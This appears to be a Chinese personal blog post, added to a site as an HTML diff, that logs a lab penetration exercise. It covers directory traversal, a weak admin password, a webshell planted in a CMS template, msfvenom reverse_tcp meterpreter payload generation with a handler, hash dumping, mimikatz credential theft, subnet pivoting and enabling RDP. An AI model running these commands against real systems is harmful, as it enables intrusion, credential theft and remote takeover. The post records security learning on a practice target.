@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="nmap扫不到，但是可以ping通= =
+打开主页之后是phpstudy探针，按照官方文档关闭
+然后访问，是个目录遍历漏洞= =
+经过配置进入了主页
+找到后台发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口
+尝试弱密码admin/123456可以登陆
+后台操作
+有个" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>靶机看答案渗透记录-1 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="nmap扫不到，但是可以ping通&#x3D; &#x3D; 打开主页之后是phpstudy探针，按照官方文档关闭 然后访问，是个目录遍历漏洞&#x3D; &#x3D; 经过配置进入了主页 找到后台发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口 尝试弱密码admin&#x2F;123456可以登陆 后台操作 有个sql执行可以执行某些操作 修改首页模板，index.php可以添加一句话木马， 使用weevely">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机看答案渗透记录-1">
+<meta property="og:url" content="http://example.com/2020/11/24/note/web/pentist-1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap扫不到，但是可以ping通&#x3D; &#x3D; 打开主页之后是phpstudy探针，按照官方文档关闭 然后访问，是个目录遍历漏洞&#x3D; &#x3D; 经过配置进入了主页 找到后台发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口 尝试弱密码admin&#x2F;123456可以登陆 后台操作 有个sql执行可以执行某些操作 修改首页模板，index.php可以添加一句话木马， 使用weevely">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-11-24T08:42:52.000Z">
+<meta property="article:modified_time" content="2020-11-25T08:43:57.676Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="Hexo" rel="home">Hexo</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-note/web/pentist-1" class="post-note/web/pentist-1 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      靶机看答案渗透记录-1
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2020/11/24/note/web/pentist-1/" data-id="ckhx5vzvk0000lowbcptm8drg" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>nmap扫不到，但是可以ping通= =</p>
+<p>打开主页之后是phpstudy探针，按照官方文档关闭</p>
+<p>然后访问，是个目录遍历漏洞= =</p>
+<p>经过配置进入了主页</p>
+<h2 id="找到后台"><a href="#找到后台" class="headerlink" title="找到后台"></a>找到后台</h2><p>发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口</p>
+<p>尝试弱密码admin/123456可以登陆</p>
+<h2 id="后台操作"><a href="#后台操作" class="headerlink" title="后台操作"></a>后台操作</h2><ol>
+<li>有个sql执行可以执行某些操作</li>
+<li>修改首页模板，index.php可以添加一句话木马， 使用weevely访问失败，但是可以使用 <a target="_blank" rel="noopener" href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">AntSword</a> 访问</li>
+<li><p>有个gethash的工具可以获取windows上面密码的hash值，但是没下到<br>网上找到一个渗透工具集，好家伙<del>白嫖真爽</del></p>
+<p>pwdump也可以获取hash，获取到了hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">liukaifeng01:1000:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure></li>
+<li>虽然找到了hash值，但是没有找到密码</li>
+<li>开启了3306端口，可以尝试连接，但是连接失败，不允许连接</li>
+<li>使用msf生成木马<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.117 lport=4444 -f exe -o /root/桌面/hakcer.exe</span><br></pre></td></tr></table></figure>
+kali下可以使用msfpc简化<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfpc windows reverse eth1 4444</span><br></pre></td></tr></table></figure></li>
+<li>msf使用exploit/multi/handler模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+上传生成的木马到靶机，执行，连接成功，执行sysinfo命令测试是否成功</li>
+<li>run vnc进行桌面监控</li>
+<li>run autoroute -s 192.168.52.1/24<br> 这条命令允许攻击机进入192.168.52.1/24子网</li>
+<li>arp -a查看域控成员</li>
+<li>使用background把当前session保存至后台</li>
+<li>扫描远端IP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li>
+<li>开放了445端口，ms17_010漏洞，大佬说蓝屏，还没试</li>
+<li>ms08_067攻击失败</li>
+<li>再次连接win7，使用load mimikatz获得凭证</li>
+<li>getsystem命令 sysinfo命令 ps命令</li>
+<li>migrate命令，explorer为2872</li>
+<li>之前load了mimikatz(kiwi)插件，然后执行creds_tspkg获取域控密码，新版本msf变了，遇事不决help</li>
+<li>使用run post/windows/manage/enable_rdp开启windows的rdp远程桌面</li>
+<li>linux使用rdesktop连接，windows直接使用远程桌面连接<br>用户名和密码为Administrator/hongrisec@2019</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>知道系统相关信息之后可以下载相关源码进行审计发现漏洞。从而找到管理登陆页面，弱密码等</li>
+<li>pwdump可以获取windows的密码哈希值</li>
+<li>msfvenom可以生成木马，msfpc简化生成操作，木马连接到exploit/multi/handler</li>
+<li>run vnc用于监控桌面，远程桌面等</li>
+<li>run autoroute -s 192.168.52.1/24，这条命令允许攻击机进入192.168.52.1/24子网</li>
+<li>msf background把当前session保存至后台，sessions -l 列出所有session，sessions num切换至第num个session</li>
+<li>使用auxiliary/scanner/portscan/tcp扫描对应网段的主机</li>
+<li>mimikatz插件用于获取登陆凭证，插件已经被替换为kiwi，使用help获取相关用法</li>
+<li>使用run post/windows/manage/enable_rdp开启远程桌面</li>
+<li>Linux使用rdesktop,windows使用远程桌面连接远程桌面</li>
+<li>migrate命令进程迁移，让进程成为目标机器某个合法进程的子进程，比如说explorer.exe</li>
+</ol>
+<h2 id="两个漏洞"><a href="#两个漏洞" class="headerlink" title="两个漏洞"></a>两个漏洞</h2><ol>
+<li>msf17_010</li>
+<li>msf08_067<br>都使用了445端口<br>MS08-067漏洞原理分析及还原 - 乃逸夫的文章 - 知乎<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27155431">https://zhuanlan.zhihu.com/p/27155431</a></li>
+</ol>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/11/24/note/web/pentist-1/">
+    <time datetime="2020-11-24T08:42:52.000Z" class="entry-date">
+        2020-11-24
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+        <span class="nav-previous"><a href="/2020/11/26/note/rev/qiling/" rel="prev"><span class="meta-nav">←</span> 麒麟框架使用--官方示例</a></span>
+    
+    
+        <span class="nav-next"><a href="/2020/11/20/writeup/kctf2020-10/wp/" rel="next">kctf2020部分wp <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/27/note/papers/1-1/">app行为的语义提取方案读论文笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/26/note/rev/qiling/">麒麟框架使用--官方示例</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/24/note/web/pentist-1/">靶机看答案渗透记录-1</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/20/writeup/kctf2020-10/wp/">kctf2020部分wp</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/20/note/web/DiD/">网络安全中的纵深防御概念</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2020 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
